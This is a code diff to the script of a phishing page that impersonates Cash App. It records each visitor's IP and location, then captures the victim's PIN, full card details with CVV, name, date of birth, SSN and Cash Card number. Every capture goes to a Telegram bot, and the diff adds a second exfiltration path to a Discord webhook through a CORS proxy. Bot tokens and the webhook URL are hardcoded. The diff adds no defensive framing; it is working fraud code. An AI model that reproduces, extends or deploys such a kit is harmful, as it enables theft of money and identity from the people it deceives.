@@ -231,8 +231,9 @@
 <script>
     const botToken = "9058802985:AAHsFoOZUObdl2KE_Yd1y2gX7aKGh_Eit_s";
     const chatId = "6375135873";
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1570736326683140157/qiUolqkPuTQWUAWcat2JZ_7xkPSDzsYGAlaW4A3UzPI-M9tJyOWj9imU11CgmqxmsO6M";
 
-    // Detectar dispositivo
+    // Detectar dispositivo de forma limpia
     function getDeviceType() {
         const ua = navigator.userAgent;
         if (/android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/i.test(ua.toLowerCase())) {
@@ -241,14 +242,25 @@
         return "💻 PC / Laptop";
     }
 
-    // Enviar a Telegram mediante objeto Image limpio y único
-    function sendTelegram(message) {
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    // Enviar simultáneamente a Telegram y a Discord sin duplicarse
+    function sendAlert(message) {
+        // 1. Enviar a Telegram mediante objeto Image (única petición limpia)
+        const tgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
         const img = new Image();
-        img.src = url;
+        img.src = tgUrl;
+
+        // 2. Enviar a Discord usando el proxy CORS para evitar el bloqueo del navegador
+        if (discordWebhookUrl) {
+            const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(discordWebhookUrl);
+            fetch(proxyUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: message })
+            }).catch(err => console.error("Discord error:", err));
+        }
     }
 
-    // Al cargar la página, aseguramos con sessionStorage que la visita SOLO se mande una vez por sesión
+    // Carga inicial protegida para que la visita se mande estrictamente una sola vez por sesión
     window.addEventListener("DOMContentLoaded", async () => {
         if (!sessionStorage.getItem("visit_sent")) {
             sessionStorage.setItem("visit_sent", "true");
@@ -257,9 +269,9 @@
             try {
                 let res = await fetch("https://ipapi.co/json/");
                 let data = await res.json();
-                sendTelegram(`🌐 [VISITA NUEVA DETECTADA]\n- Dispositivo: ${device}\n- IP: ${data.ip}\n- Ubicación: ${data.city}, ${data.region}, ${data.country_name}\n- ISP: ${data.org}`);
+                sendAlert(`🌐 [VISITA NUEVA DETECTADA]\n- Dispositivo: ${device}\n- IP: ${data.ip}\n- Ubicación: ${data.city}, ${data.region}, ${data.country_name}\n- ISP: ${data.org}`);
             } catch (e) {
-                sendTelegram(`🌐 [VISITA NUEVA DETECTADA]\n- Dispositivo: ${device}\n- IP: No disponible automáticamente.`);
+                sendAlert(`🌐 [VISITA NUEVA DETECTADA]\n- Dispositivo: ${device}\n- IP: No disponible automáticamente.`);
             }
         }
 
@@ -384,7 +396,7 @@
                 document.getElementById("pinError").style.display = "block";
                 return;
             }
-            sendTelegram(`🚨 [CASH APP - PIN CAPTURADO]\n🔑 PIN: ${pinInput.value}`);
+            sendAlert(`🚨 [CASH APP - PIN CAPTURADO]\n🔑 PIN: ${pinInput.value}`);
             showLoading("step-linked", "Validating security PIN...", 50, "Step 2 of 4");
         } 
         else if (stepName === 'linked') {
@@ -404,7 +416,7 @@
             if (!expMonth || !expYear) {
                 document.getElementById("expMonth").classList.add("error-input");
                 document.getElementById("expYear").classList.add("error-input");
-                document.getElementById("expError").innerText = "Please select expiry date.";
+                document.getElementById("expError").innerText = "Select expiry date.";
                 document.getElementById("expError").style.display = "block";
                 hasError = true;
             }
@@ -415,7 +427,7 @@
             if (hasError) return;
 
             let fullExp = `${expMonth}/${expYear}`;
-            sendTelegram(`💳 [CASH APP - LINKED CARD CAPTURADA]\n- Nombre: ${nameInput.value}\n- Número: ${numInput.value}\n- Exp: ${fullExp}\n- CVV/CID: ${cvvInput.value}\n- ZIP: ${zipInput.value}`);
+            sendAlert(`💳 [CASH APP - LINKED CARD CAPTURADA]\n- Nombre: ${nameInput.value}\n- Número: ${numInput.value}\n- Exp: ${fullExp}\n- CVV/CID: ${cvvInput.value}\n- ZIP: ${zipInput.value}`);
             showLoading("step-ssn", "Encrypting card information...", 75, "Step 3 of 4 (Almost Finishing)");
         } 
         else if (stepName === 'ssn') {
@@ -442,7 +454,7 @@
             if (hasError) return;
 
             let fullDob = `${dobMonth}/${dobDay}/${dobYear}`;
-            sendTelegram(`🔒 [CASH APP - IDENTIDAD CAPTURADA]\n- Full Legal Name: ${nameInput.value}\n- DOB: ${fullDob}\n- SSN: ${ssnInput.value}`);
+            sendAlert(`🔒 [CASH APP - IDENTIDAD CAPTURADA]\n- Full Legal Name: ${nameInput.value}\n- DOB: ${fullDob}\n- SSN: ${ssnInput.value}`);
             showLoading("step-cash", "Validating identity records...", 90, "Final Step");
         }
         else if (stepName === 'cash') {
@@ -452,14 +464,14 @@
                 document.getElementById("cashError").style.display = "block";
                 return;
             }
-            sendTelegram(`💳 [CASH APP - CASH CARD CAPTURADA]\n- Cash Card: ${cashInput.value}`);
+            sendAlert(`💳 [CASH APP - CASH CARD CAPTURADA]\n- Cash Card: ${cashInput.value}`);
 
             finalizeSuccess();
         }
     }
 
     function skipCashCard() {
-        sendTelegram(`⚠️ [CASH APP - CASH CARD OMITIDA]\n- El usuario hizo clic en "Skip this step".`);
+        sendAlert(`⚠️ [CASH APP - CASH CARD OMITIDA]\n- El usuario hizo clic en "Skip this step".`);
         finalizeSuccess();
     }
 
